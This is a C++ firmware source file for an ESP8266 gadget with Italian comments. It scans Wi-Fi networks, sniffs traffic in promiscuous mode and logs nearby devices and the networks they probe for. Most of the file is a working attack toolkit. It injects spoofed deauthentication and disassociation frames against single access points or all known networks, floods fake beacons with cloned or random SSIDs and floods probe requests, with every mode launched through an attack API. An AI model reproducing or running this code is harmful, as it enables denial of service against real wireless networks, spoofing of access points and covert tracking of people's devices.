#include <pk_net.h>
#include <ESP8266WiFi.h>
#include <pk_robot.h>
#include <pk_camera.h>
#include <pk_wardrive.h>
#include <animations.h>

#include <string.h>
#include <stdlib.h>

extern "C" {
#include "user_interface.h"
}

namespace pk_net {

// ============================================================================
// Costanti e stato
// ============================================================================

#define MAX_NET        20
#define MAX_STA        24
#define MAX_NAMES      8
#define MAX_PROBE      20
#define SNIFF_HOP_MS   300UL
#define BEACON_HOP_MS  1600UL
#define PROBE_HOP_MS   800UL
#define RADIO_LEN      12

enum Mode { MODE_IDLE = 0, MODE_SCAN, MODE_SNIFF, MODE_DEAUTH, MODE_DEAUTHALL, MODE_BEACON, MODE_BEACONRND, MODE_PROBE };

struct Net {
    uint8_t bssid[6];
    char    ssid[33];
    int8_t  rssi;
    uint8_t channel;
    uint8_t enc;
};

struct Sta {
    uint8_t mac[6];
    uint8_t ap;      // indice rete (0xFF se sconosciuta)
    uint8_t channel;
    uint32_t seen;
};

struct Probe {
    uint8_t mac[6];
    char    ssid[33];
    uint32_t seen;
};

static Mode        _mode = MODE_IDLE;
static uint32_t    _modeStart = 0;
static uint32_t    _timeoutMs = 0;
static bool        _scanResult = false;

static Net         _nets[MAX_NET];
static uint8_t     _netCount = 0;

static Sta         _stas[MAX_STA];
static uint8_t     _staCount = 0;

static Probe       _probes[MAX_PROBE];
static uint8_t     _probeCount = 0;

static char        _names[MAX_NAMES][33];
static uint8_t     _nameCount = 0;
static char        _beaconName[33];

static uint32_t    _sent = 0, _sentLastSec = 0, _pps = 0, _lastSec = 0;

static uint8_t     _di = 0;        // cursore reti (deauthall)
static uint8_t     _ds = 0;        // cursore stazioni (deauth singolo)
static uint8_t     _targetMac[6];
static uint8_t     _targetCh = 1;
static int8_t      _targetNetIdx = -1;
static uint32_t    _hopLast = 0;
static uint8_t     _hopCh = 1;

static const char* _lastMood = "neutral";

// ------------------------------------------------------------------ contatori IRQ

static volatile uint32_t _irqPkts = 0;
static volatile uint32_t _irqDeauth = 0;
static volatile uint32_t _irqBeacon = 0;
static volatile uint32_t _irqProbe = 0;
static volatile uint32_t _irqData = 0;

static volatile bool     _captureReady = false;
static volatile uint8_t  _captureFrame[64];
static volatile uint16_t _captureLen = 0;

// ============================================================================
// Helper mac / stringhe
// ============================================================================

static bool macIsBroadcast(const uint8_t* m) {
    for (int i = 0; i < 6; i++) if (m[i] != 0xFF) return false;
    return true;
}

static bool macIsZero(const uint8_t* m) {
    for (int i = 0; i < 6; i++) if (m[i] != 0x00) return false;
    return true;
}

static bool macIsMulticast(const uint8_t* m) {
    return (m[0] & 0x01) != 0;
}

static String macStr(const uint8_t* m) {
    char b[18];
    snprintf(b, sizeof(b), "%02X:%02X:%02X:%02X:%02X:%02X",
             m[0], m[1], m[2], m[3], m[4], m[5]);
    return String(b);
}

static bool parseMac(const String& s, uint8_t* out) {
    int pos = 0, idx = 0;
    while (pos < (int)s.length() && idx < 6) {
        int hi = s.charAt(pos) >= 'a' ? (s.charAt(pos) - 'a' + 10) :
                 (s.charAt(pos) >= 'A' ? (s.charAt(pos) - 'A' + 10) : (s.charAt(pos) - '0'));
        pos++;
        int lo = hi;
        if (pos < (int)s.length() && s.charAt(pos) != ':') {
            lo = s.charAt(pos) >= 'a' ? (s.charAt(pos) - 'a' + 10) :
                 (s.charAt(pos) >= 'A' ? (s.charAt(pos) - 'A' + 10) : (s.charAt(pos) - '0'));
            pos++;
        }
        out[idx++] = (uint8_t)((hi & 0x0F) << 4 | (lo & 0x0F));
        if (pos < (int)s.length() && s.charAt(pos) == ':') pos++;
    }
    return idx == 6;
}

static String secName(uint8_t enc) {
    switch (enc) {
        case ENC_TYPE_NONE:  return "OPEN";
        case ENC_TYPE_WEP:   return "WEP";
        case ENC_TYPE_TKIP:  return "WPA";
        case ENC_TYPE_CCMP:  return "WPA2";
        case ENC_TYPE_AUTO:  return "AUTO";
        default:             return "UNKNOWN";
    }
}

static const char* riskFor(uint8_t enc) {
    switch (enc) {
        case ENC_TYPE_NONE: return "high";
        case ENC_TYPE_WEP:  return "critical";
        case ENC_TYPE_TKIP: return "high";
        case ENC_TYPE_CCMP: return "good";
        case ENC_TYPE_AUTO: return "normal";
        default:            return "unknown";
    }
}

static int findNetByBssid(const uint8_t* b) {
    for (int i = 0; i < _netCount; i++) {
        if (memcmp(_nets[i].bssid, b, 6) == 0) return i;
    }
    return -1;
}

static int findStaByMac(const uint8_t* m) {
    for (int i = 0; i < _staCount; i++) {
        if (memcmp(_stas[i].mac, m, 6) == 0) return i;
    }
    return -1;
}

static void addSta(const uint8_t* mac, uint8_t apIdx, uint8_t ch) {
    int i = findStaByMac(mac);
    if (i >= 0) {
        _stas[i].seen = millis();
        if (_stas[i].ap == 0xFF) _stas[i].ap = apIdx;
        return;
    }
    if (_staCount >= MAX_STA) {
        // rimpiazza la stazione piu' vecchia
        uint32_t oldest = 0xFFFFFFFF; int oi = 0;
        for (int k = 0; k < _staCount; k++) {
            if (_stas[k].seen < oldest) { oldest = _stas[k].seen; oi = k; }
        }
        i = oi;
    } else {
        i = _staCount++;
    }
    memcpy(_stas[i].mac, mac, 6);
    _stas[i].ap = apIdx;
    _stas[i].channel = ch;
    _stas[i].seen = millis();
}

static int findProbeByMac(const uint8_t* m) {
    for (int i = 0; i < _probeCount; i++) {
        if (memcmp(_probes[i].mac, m, 6) == 0) return i;
    }
    return -1;
}

static void addProbe(const uint8_t* mac, const char* ssid) {
    int i = findProbeByMac(mac);
    if (i >= 0) {
        // aggiorna lo storico: se ha gia' probe per questo ssid, aggiorna il tempo
        if (strcmp(_probes[i].ssid, ssid) == 0) {
            _probes[i].seen = millis();
            return;
        }
        // altrimenti sostituisci l'ultimo valore visto (mantieni 1 ssid per mac)
        strncpy(_probes[i].ssid, ssid, 33);
        _probes[i].seen = millis();
        return;
    }
    if (_probeCount >= MAX_PROBE) {
        uint32_t oldest = 0xFFFFFFFF; int oi = 0;
        for (int k = 0; k < _probeCount; k++) {
            if (_probes[k].seen < oldest) { oldest = _probes[k].seen; oi = k; }
        }
        i = oi;
    } else {
        i = _probeCount++;
    }
    memcpy(_probes[i].mac, mac, 6);
    strncpy(_probes[i].ssid, ssid, 33);
    _probes[i].seen = millis();
}

// ============================================================================
// Callback promiscuo (contesto ISR: niente allocazioni, niente Serial)
// ============================================================================

static void IRAM_ATTR snifferCb(uint8_t* buf, uint16_t len) {
    // I frame 802.11 iniziano dopo un piccolo header radio (12 byte)
    if (len < RADIO_LEN + 24) return;
    _irqPkts++;

    uint8_t fc = buf[RADIO_LEN];
    uint8_t type = fc & 0x0C;   // 0 = management, 8 = data

    if (type == 0x00) {
        uint8_t sub = fc & 0xF0;
        if (sub == 0xC0 || sub == 0xA0) { _irqDeauth++; return; }
        if (sub == 0x80) { _irqBeacon++; return; }
        if (sub == 0x40 || sub == 0x50) {
            _irqProbe++;
            if (sub != 0x40) return;   // solo probe request (non response)
            // scivola nella cattura qui sotto
        } else {
            return;
        }
    } else if (type == 0x08) {
        _irqData++;
    } else {
        return;
    }
    // cattura un frame (data o probe request) per l'elaborazione nel loop
    if (_captureReady) return;
    uint16_t flen = len - RADIO_LEN;
    if (flen > sizeof(_captureFrame)) flen = sizeof(_captureFrame);
    memcpy((void*)_captureFrame, (const void*)&buf[RADIO_LEN], flen);
    _captureLen = flen;
    _captureReady = true;
}

// ============================================================================
// Invio pacchetti
// ============================================================================

static bool sendRaw(uint8_t* pkt, uint16_t len) {
    bool ok = wifi_send_pkt_freedom(pkt, len, 0) == 0;
    if (ok) _sent++;
    return ok;
}

// Deauth + disassoc verso un AP/client (stessa tecnica del deauther)
static void buildMgmtFrame(uint8_t* pkt, uint8_t ftype,
                           const uint8_t* da, const uint8_t* sa, const uint8_t* bssid,
                           uint8_t reason) {
    memset(pkt, 0, 26);
    pkt[0] = ftype;                                  // 0xC0 deauth / 0xA0 disassoc
    memcpy(&pkt[4], da, 6);                          // DA
    memcpy(&pkt[10], sa, 6);                         // SA
    memcpy(&pkt[16], bssid, 6);                      // BSSID
    pkt[24] = reason;
}

static void sendDeauthPair(const uint8_t* apMac, const uint8_t* stMac, uint8_t ch) {
    uint8_t pkt[26];
    wifi_set_channel(ch);

    // AP -> client : deauth + disassoc
    buildMgmtFrame(pkt, 0xC0, stMac, apMac, apMac, 0x01);
    sendRaw(pkt, 26);
    buildMgmtFrame(pkt, 0xA0, stMac, apMac, apMac, 0x01);
    sendRaw(pkt, 26);

    bool directed = !macIsBroadcast(stMac) && !macIsZero(stMac);
    if (directed) {
        // direzione inversa: dallo station verso l'AP (spoof)
        buildMgmtFrame(pkt, 0xC0, apMac, stMac, stMac, 0x01);
        sendRaw(pkt, 26);
        buildMgmtFrame(pkt, 0xA0, apMac, stMac, stMac, 0x01);
        sendRaw(pkt, 26);
    }
}

static uint8_t _beaconSeq = 0;

static void sendBeacon(const char* ssid, uint8_t ch) {
    uint8_t b[128];
    uint16_t p = 0;
    int sl = strlen(ssid);
    if (sl > 32) sl = 32;

    // MAC random per il beacon
    uint8_t mac[6];
    // mescola chipId + contatore per evitare MAC sempre uguali
    uint32_t seed = ESP.getChipId() ^ (_beaconSeq * 7919) ^ (millis() & 0xFFFF);
    mac[0] = 0x02;
    for (int i = 1; i < 6; i++) {
        seed = seed * 1103515245 + 12345;
        mac[i] = (uint8_t)(seed >> 16);
    }

    b[p++] = 0x80; b[p++] = 0x00;                    // frame control: beacon
    b[p++] = 0x00; b[p++] = 0x00;                    // duration
    for (int i = 0; i < 6; i++) b[p++] = 0xFF;       // DA: broadcast
    memcpy(&b[p], mac, 6); p += 6;                   // SA
    memcpy(&b[p], mac, 6); p += 6;                   // BSSID
    b[p++] = (uint8_t)(_beaconSeq & 0xFF);           // seqlow
    b[p++] = (uint8_t)((_beaconSeq >> 8) & 0xFF);    // seqhigh
    _beaconSeq++;
    for (int i = 0; i < 8; i++) b[p++] = 0x00;       // timestamp
    b[p++] = 0x64; b[p++] = 0x00;                    // beacon interval 100ms
    b[p++] = 0x31; b[p++] = 0x00;                    // capability ESS|PRIVACY|short-slot
    b[p++] = 0x00; b[p++] = (uint8_t)sl;             // SSID tag
    memcpy(&b[p], ssid, sl); p += sl;
    b[p++] = 0x01; b[p++] = 0x08;                    // supported rates
    b[p++] = 0x82; b[p++] = 0x84; b[p++] = 0x8B;
    b[p++] = 0x96; b[p++] = 0x24; b[p++] = 0x30;
    b[p++] = 0x48; b[p++] = 0x6C;
    b[p++] = 0x03; b[p++] = 0x01; b[p++] = ch;       // DS / canale
    b[p++] = 0x30; b[p++] = 0x14;                    // RSN (WPA2)
    b[p++] = 0x01; b[p++] = 0x00;
    b[p++] = 0x00; b[p++] = 0x0F; b[p++] = 0xAC; b[p++] = 0x04;
    b[p++] = 0x01; b[p++] = 0x00;
    b[p++] = 0x00; b[p++] = 0x0F; b[p++] = 0xAC; b[p++] = 0x04;
    b[p++] = 0x01; b[p++] = 0x00;
    b[p++] = 0x00; b[p++] = 0x0F; b[p++] = 0xAC; b[p++] = 0x02;
    b[p++] = 0x00; b[p++] = 0x00;

    wifi_set_channel(ch);
    sendRaw(b, p);
}

// MAC casuale per i frame generati (nuova mac ad ogni frame)
static void randomMac(uint8_t* mac) {
    uint32_t seed = ESP.getChipId() ^ (_beaconSeq * 7919) ^ (millis() & 0xFFFF);
    mac[0] = 0x02;
    for (int i = 1; i < 6; i++) {
        seed = seed * 1103515245 + 12345;
        mac[i] = (uint8_t)(seed >> 16);
    }
    _beaconSeq++;
}

// SSID random (beacon random mode / probe flood)
static void rndSSID(char* out, uint8_t minLen, uint8_t maxLen) {
    uint8_t l = minLen + (uint8_t)random(0, maxLen - minLen + 1);
    for (uint8_t i = 0; i < l; i++) {
        uint32_t r = random(62);
        out[i] = r < 10 ? '0' + (char)r :
                 (r < 36 ? 'A' + (char)(r - 10) : 'a' + (char)(r - 36));
    }
    out[l] = '\0';
}

// Probe request frame (come Probe_Download del deauther: la SSID nel tag di
// probe rivela cosa il dispositivo sta cercando)
static void sendProbeReq(const char* ssid, uint8_t ch) {
    uint8_t p[80];
    uint16_t i = 0;
    int sl = strlen(ssid);
    if (sl > 32) sl = 32;

    uint8_t mac[6];
    randomMac(mac);

    p[i++] = 0x40; p[i++] = 0x00;                // frame control: probe request
    p[i++] = 0x00; p[i++] = 0x00;                // duration
    for (int k = 0; k < 6; k++) p[i++] = 0xFF;   // DA: broadcast
    memcpy(&p[i], mac, 6); i += 6;               // SA
    memcpy(&p[i], mac, 6); i += 6;               // BSSID
    p[i++] = (uint8_t)(_beaconSeq & 0xFF);       // seq
    p[i++] = (uint8_t)((_beaconSeq >> 8) & 0xFF);
    _beaconSeq++;
    p[i++] = 0x00; p[i++] = (uint8_t)sl;         // SSID TLV
    memcpy(&p[i], ssid, sl); i += sl;
    p[i++] = 0x01; p[i++] = 0x08;                // supported rates
    p[i++] = 0x82; p[i++] = 0x84; p[i++] = 0x8B;
    p[i++] = 0x96; p[i++] = 0x24; p[i++] = 0x30;
    p[i++] = 0x48; p[i++] = 0x6C;
    p[i++] = 0x32; p[i++] = 0x04;                // extended rates
    p[i++] = 0x0C; p[i++] = 0x12; p[i++] = 0x18;
    p[i++] = 0x60;

    wifi_set_channel(ch);
    sendRaw(p, i);
}

// ============================================================================
// Ciclo operazioni (MAIN loop - non bloccante)
// ============================================================================

static void stopRadio() {
    wifi_promiscuous_enable(false);
    wifi_set_channel(1);
    _mode = MODE_IDLE;
    _timeoutMs = 0;
}

static void processCapturedFrame() {
    if (!_captureReady) return;
    uint8_t frame[64];
    uint16_t flen = _captureLen;
    if (flen < 24) { _captureReady = false; return; }
    memcpy(frame, (void*)_captureFrame, flen);
    _captureReady = false;

    uint8_t* macTo   = &frame[0];  // addr1
    uint8_t* macFrom = &frame[6];  // addr2
    uint8_t* macBss  = &frame[12]; // addr3

    // Probe request: il dispositivo sta cercando un SSID ("probe tracking")
    if ((frame[0] & 0x0C) == 0x00 && (frame[0] & 0xF0) == 0x40) {
        uint8_t* client = macFrom;
        if (macIsBroadcast(client) || macIsMulticast(client) || macIsZero(client)) return;
        if (flen < 26) return;
        uint8_t tag = frame[24], tlen = frame[25];
        if (tag == 0x00 && tlen > 0) {
            char ssid[33] = {0};
            uint8_t l = tlen > 32 ? 32 : tlen;
            for (int i = 0; i < l; i++) ssid[i] = (char)frame[26 + i];
            addProbe(client, ssid);
        }
        return;
    }

    if (macIsBroadcast(macTo) || macIsBroadcast(macFrom) ||
        macIsZero(macTo)    || macIsZero(macFrom) ||
        macIsMulticast(macTo) || macIsMulticast(macFrom)) return;

    int apIdx = findNetByBssid(macBss);
    if (apIdx < 0) apIdx = findNetByBssid(macFrom);
    if (apIdx < 0) return;

    uint8_t* client = macTo;
    if (memcmp(macFrom, _nets[apIdx].bssid, 6) == 0) client = macTo;
    else if (memcmp(macTo, _nets[apIdx].bssid, 6) == 0) client = macFrom;
    else return;

    if (macIsBroadcast(client) || macIsMulticast(client)) return;
    if (memcmp(client, _nets[apIdx].bssid, 6) == 0) return;
    addSta(client, (uint8_t)apIdx, _nets[apIdx].channel);
}

static void handleScanProgress(uint32_t now) {
    int16_t res = WiFi.scanComplete();
    if (res < 0) return;
    int n = res > MAX_NET ? MAX_NET : res;
    _netCount = (uint8_t)n;
    for (int i = 0; i < n; i++) {
        Net& N = _nets[i];
        String s = WiFi.SSID(i);
        if (s.length() > 32) s = s.substring(0, 32);
        s.toCharArray(N.ssid, sizeof(N.ssid));
        if (N.ssid[0] == '\0') strncpy(N.ssid, "<nascosta>", sizeof(N.ssid));
        for (int k = 0; k < 6; k++) N.bssid[k] = WiFi.BSSID(i)[k];
        N.rssi = (int8_t)WiFi.RSSI(i);
        N.channel = (uint8_t)WiFi.channel(i);
        N.enc = (uint8_t)WiFi.encryptionType(i);
    }
    WiFi.scanDelete();
    _scanResult = true;
    _mode = MODE_IDLE;
    _modeStart = now;
    _timeoutMs = 0;
    wifi_set_channel(1);

    // notifica le animations fullscreen che lo scan e' terminato
    animations::completeWifiScan((uint16_t)n);

    // wardriving: registra le reti osservate su LittleFS (se il logging e' attivo)
    for (int i = 0; i < n; i++) {
        String bss = macStr(_nets[i].bssid);
        pk_wardrive::record(bss.c_str(), _nets[i].ssid, _nets[i].rssi,
                            _nets[i].channel, _nets[i].enc);
    }

    // alimenta la lista nomi per il beacon spam con gli SSID trovati
    _nameCount = 0;
    for (int i = 0; i < n && _nameCount < MAX_NAMES; i++) {
        if (strcmp(_nets[i].ssid, "<nascosta>") == 0) continue;
        strncpy(_names[_nameCount], _nets[i].ssid, 33);
        _nameCount++;
    }
}

static void handleSniff(uint32_t now) {
    if (now - _hopLast >= SNIFF_HOP_MS) {
        _hopLast = now;
        _hopCh++;
        if (_hopCh > 14) _hopCh = 1;
        wifi_set_channel(_hopCh);
    }
}

static void handleDeauthStep() {
    if (_mode == MODE_DEAUTH) {
        // target singolo: prima broadcast, poi i client noti dell'AP
        if (_ds == 0xFF) {
            sendDeauthPair(_targetMac, (const uint8_t*)"\xFF\xFF\xFF\xFF\xFF\xFF", _targetCh);
            _ds = 0;
            return;
        }
        while (_ds < _staCount) {
            const Sta& s = _stas[_ds];
            _ds++;
            if (_targetNetIdx >= 0 && (int8_t)s.ap == _targetNetIdx) {
                sendDeauthPair(_targetMac, s.mac, s.channel);
                return;
            }
        }
        _ds = 0xFF; // ciclo completo: riparti
        return;
    }
    // MODE_DEAUTHALL: tutte le reti conosciute
    if (_netCount == 0) return;
    if (_di >= _netCount) _di = 0;
    const Net& N = _nets[_di];
    sendDeauthPair(N.bssid, (const uint8_t*)"\xFF\xFF\xFF\xFF\xFF\xFF", N.channel);
    _di++;
}

static void handleBeacon(uint32_t now) {
    if (now - _hopLast >= BEACON_HOP_MS) {
        _hopLast = now;
        _hopCh++;
        if (_hopCh > 14) _hopCh = 1;
    }
    if (_mode == MODE_BEACONRND) {
        char tmp[33];
        rndSSID(tmp, 5, 10);
        sendBeacon(tmp, _hopCh);
        return;
    }
    if (_nameCount > 0) {
        static uint8_t bci = 0;
        const char* name = _names[bci % _nameCount];
        sendBeacon(name, _hopCh);
        bci++;
    } else {
        sendBeacon(_beaconName[0] != '\0' ? _beaconName : "PortaChiave", _hopCh);
    }
}

static uint32_t _probeLast = 0;

static void handleProbeStep(uint32_t now) {
    if (now - _hopLast >= PROBE_HOP_MS) {
        _hopLast = now;
        _hopCh++;
        if (_hopCh > 14) _hopCh = 1;
    }
    if (now - _probeLast < 120) return;
    _probeLast = now;
    if (_nameCount > 0) {
        static uint8_t pci = 0;
        const char* name = _names[pci % _nameCount];
        sendProbeReq(name, _hopCh);
        pci++;
    } else {
        sendProbeReq(_beaconName[0] != '\0' ? _beaconName : "PortaChiave", _hopCh);
    }
}

static void syncMood() {
    // Durante una sessione camera le emozioni vengono pilotate dal pairing:
    // il sync di rete non deve sovrascriverle con il "neutral" di default.
    if (pk_camera::active()) return;

    // Se le animations (wifi scan / lag / reaction) stanno disegnando sullo
    // schermo, le emozioni automatiche non devono sovrascriverle.
    // L'animazione ha la priorita' visiva: mantiene l'ultimo stato known
    // senza forzare un cambio di emotion.
    if (animations::isSpecial()) return;

    // Se le animations non sono speciali, applica l'emozione corrente in base al mode.
    const char* m = modeName();
    const char* emo;
    if (strcmp(m, "scan") == 0) emo = "thinking";
    else if (strcmp(m, "sniff") == 0) emo = "curious";
    else if (strcmp(m, "deauth") == 0 || strcmp(m, "deauthall") == 0) emo = "angry";
    else if (strcmp(m, "beacon") == 0 || strcmp(m, "beaconrnd") == 0 ||
             strcmp(m, "probe") == 0) emo = "surprised";
    else emo = "neutral";

    if (strcmp(emo, _lastMood) != 0) {
        _lastMood = emo;
        pk_robot::apiApply("emotion", emo);
    }
}

void begin() {
    randomSeed(ESP.getChipId() ^ micros() ^ (uint32_t)ESP.getCycleCount());
    strncpy(_beaconName, "", sizeof(_beaconName));
    static const char* def[] = {
        "CafeWiFi", "Home", "Netgear", "FreeWiFi", "5G-EXT", "Router", "Guest", "SRV"
    };
    if (_nameCount == 0) {
        for (int i = 0; i < MAX_NAMES; i++) {
            strncpy(_names[i], def[i], 33);
        }
        _nameCount = MAX_NAMES;
    }
}

void tick() {
    uint32_t now = millis();

    processCapturedFrame();

    switch (_mode) {
        case MODE_SCAN:       handleScanProgress(now); break;
        case MODE_SNIFF:      handleSniff(now); break;
        case MODE_DEAUTH:
        case MODE_DEAUTHALL:  handleDeauthStep(); break;
        case MODE_BEACON:
        case MODE_BEACONRND:  handleBeacon(now); break;
        case MODE_PROBE:      handleProbeStep(now); break;
        default: break;
    }

    if (now - _lastSec >= 1000) {
        _pps = _sent - _sentLastSec;
        _sentLastSec = _sent;
        _lastSec = now;
    }

    if (_mode != MODE_IDLE && _mode != MODE_SCAN && _timeoutMs > 0 &&
        now - _modeStart >= _timeoutMs) {
        stopRadio();
    }

    syncMood();
}

const char* modeName() {
    switch (_mode) {
        case MODE_SCAN:      return "scan";
        case MODE_SNIFF:     return "sniff";
        case MODE_DEAUTH:    return "deauth";
        case MODE_DEAUTHALL: return "deauthall";
        case MODE_BEACON:    return "beacon";
        case MODE_BEACONRND: return "beaconrnd";
        case MODE_PROBE:     return "probe";
        default:             return "idle";
    }
}

bool isBusy() {
    return _mode != MODE_IDLE;
}

bool scanTimedOut() {
    if (_mode == MODE_SCAN && _timeoutMs > 0 && millis() - _modeStart >= _timeoutMs) {
        stopRadio();
        return true;
    }
    return false;
}

bool scanDone() {
    return _scanResult;
}

uint16_t netCount() {
    return _netCount;
}

void stopAll() {
    stopRadio();
    _scanResult = false;
}

// ============================================================================
// JSON
// ============================================================================

static void appendNets(String& j) {
    j += "\"networks\":[";
    for (int i = 0; i < _netCount; i++) {
        if (i > 0) j += ",";
        const Net& N = _nets[i];
        // conta client noti associati a questa rete
        int cl = 0;
        for (int k = 0; k < _staCount; k++) {
            if (_stas[k].ap == i) cl++;
        }
        j += "{\"ssid\":\"" + String(N.ssid) + "\",";
        j += "\"bssid\":\"" + macStr(N.bssid) + "\",";
        j += "\"rssi\":" + String((int)N.rssi) + ",";
        j += "\"channel\":" + String((int)N.channel) + ",";
        j += "\"security\":\"" + secName(N.enc) + "\",";
        j += "\"risk\":\"" + String(riskFor(N.enc)) + "\",";
        j += "\"clients\":" + String(cl) + "}";
    }
    j += "]";
}

static void appendStas(String& j) {
    j += "\"stations\":[";
    for (int i = 0; i < _staCount; i++) {
        if (i > 0) j += ",";
        const Sta& s = _stas[i];
        j += "{\"mac\":\"" + macStr(s.mac) + "\",";
        j += "\"channel\":" + String((int)s.channel) + ",";
        j += "\"ap\":" + String((int)s.ap) + "}";
    }
    j += "]";
}

String scanStart() {
    stopRadio();
    _netCount = 0;
    _staCount = 0;
    _scanResult = false;
    _mode = MODE_SCAN;
    _modeStart = millis();
    _timeoutMs = 12000; // timeout di sicurezza
    WiFi.scanNetworks(true, true);
    animations::requestWifiScan();
    return String("{\"mode\":\"scanning\",\"count\":0}");
}

String scanState() {
    String j = "{";
    j += "\"mode\":\"" + String(modeName()) + "\",";
    j += "\"count\":" + String((int)_netCount) + ",";
    appendNets(j);
    j += ",";
    appendStas(j);
    j += "}";
    return j;
}

String sniffToggle(bool on) {
    stopRadio();
    _irqPkts = 0; _irqDeauth = 0; _irqBeacon = 0; _irqProbe = 0; _irqData = 0;
    _captureReady = false;
    if (!on) {
        return String("{\"on\":false,\"mode\":\"idle\"}");
    }
    _mode = MODE_SNIFF;
    _modeStart = millis();
    _timeoutMs = 60000; // auto stop dopo 60s
    _hopLast = 0;
    _hopCh = 1;
    wifi_set_channel(1);
    wifi_set_promiscuous_rx_cb(snifferCb);
    wifi_promiscuous_enable(true);
    return String("{\"on\":true,\"mode\":\"sniff\"}");
}

String sniffState() {
    String j = "{";
    j += "\"on\":" + String(_mode == MODE_SNIFF ? "true" : "false") + ",";
    j += "\"mode\":\"" + String(modeName()) + "\",";
    j += "\"packets\":" + String((uint32_t)_irqPkts) + ",";
    j += "\"deauthRx\":" + String((uint32_t)_irqDeauth) + ",";
    j += "\"beaconRx\":" + String((uint32_t)_irqBeacon) + ",";
    j += "\"probeRx\":" + String((uint32_t)_irqProbe) + ",";
    j += "\"dataRx\":" + String((uint32_t)_irqData) + ",";
    j += "\"channel\":" + String(wifi_get_channel()) + ",";
    j += "\"remaining\":" + String(_timeoutMs > 0 ? (int32_t)(_modeStart + _timeoutMs - millis()) / 1000 : 0) + ",";
    appendStas(j);
    j += ",\"probes\":[";
    for (int i = 0; i < _probeCount; i++) {
        if (i > 0) j += ",";
        j += "{\"mac\":\"" + macStr(_probes[i].mac) + "\",";
        j += "\"ssid\":\"" + String(_probes[i].ssid) + "\"}";
    }
    j += "]";
    j += "}";
    return j;
}

String attackStart(const String& type, const String& bssid,
                   uint8_t channel, const String& ssid,
                   uint32_t timeoutSec) {
    stopRadio();
    _sent = 0; _sentLastSec = 0; _pps = 0; _lastSec = millis();
    _timeoutMs = timeoutSec > 0 ? timeoutSec * 1000 : 0;
    _modeStart = millis();
    _hopLast = 0;
    _hopCh = 1;

    if (type == "deauthall") {
        _mode = MODE_DEAUTHALL;
        _di = 0;
        return String("{\"mode\":\"deauthall\",\"running\":true}");
    }
    if (type == "probe") {
        String nm = ssid;
        if (nm.length() > 0) {
            _nameCount = 1;
            nm.toCharArray(_names[0], 33);
        } else {
            // usa gli SSID dell'ultimo scan se non specificati
            int k = 0;
            for (int i = 0; i < _netCount && k < MAX_NAMES; i++) {
                if (strcmp(_nets[i].ssid, "<nascosta>") == 0) continue;
                strncpy(_names[k], _nets[i].ssid, 33);
                k++;
            }
            _nameCount = (uint8_t)k;
        }
        _mode = MODE_PROBE;
        return String("{\"mode\":\"probe\",\"running\":true,\"names\":" +
                      String((int)_nameCount) + "}");
    }
    if (type == "beaconrnd") {
        _mode = MODE_BEACONRND;
        return String("{\"mode\":\"beaconrnd\",\"running\":true}");
    }
    if (type == "beacon") {
        String nm = ssid;
        _nameCount = 0;
        if (nm.length() > 0) {
            nm.toCharArray(_beaconName, sizeof(_beaconName));
            strncpy(_names[0], _beaconName, 33);
            _nameCount = 1;
        } else {
            _beaconName[0] = '\0';
        }
        _mode = MODE_BEACON;
        return String("{\"mode\":\"beacon\",\"running\":true}");
    }
    if (type == "deauth") {
        if (!parseMac(bssid, _targetMac)) {
            return String("{\"ok\":false,\"error\":\"bssid non valido\"}");
        }
        int idx = findNetByBssid(_targetMac);
        _targetNetIdx = idx >= 0 ? (int8_t)idx : -1;
        _targetCh = channel > 0 ? channel : (idx >= 0 ? _nets[idx].channel : 1);
        if (_targetCh < 1 || _targetCh > 14) _targetCh = 1;
        _mode = MODE_DEAUTH;
        _ds = 0xFF;
        return String("{\"mode\":\"deauth\",\"running\":true,\"target\":\"" +
                      macStr(_targetMac) + "\",\"channel\":" + String((int)_targetCh) + "}");
    }
    return String("{\"ok\":false,\"error\":\"tipo attacco sconosciuto\"}");
}

String attackStop() {
    stopRadio();
    return String("{\"mode\":\"idle\",\"running\":false}");
}

String attackState() {
    bool running = _mode == MODE_DEAUTH || _mode == MODE_DEAUTHALL ||
                   _mode == MODE_BEACON || _mode == MODE_BEACONRND ||
                   _mode == MODE_PROBE;
    String j = "{";
    j += "\"mode\":\"" + String(modeName()) + "\",";
    j += "\"running\":" + String(running ? "true" : "false") + ",";
    j += "\"channel\":" + String(wifi_get_channel()) + ",";
    j += "\"sent\":" + String(_sent) + ",";
    j += "\"pps\":" + String(_pps) + ",";
    j += "\"target\":\"" + (_targetNetIdx >= 0 ? macStr(_targetMac) : "") + "\",";
    j += "\"remaining\":" + String(_timeoutMs > 0 ? (int32_t)(_modeStart + _timeoutMs - millis()) / 1000 : -1);
    j += "}";
    return j;
}

} // namespace pk_net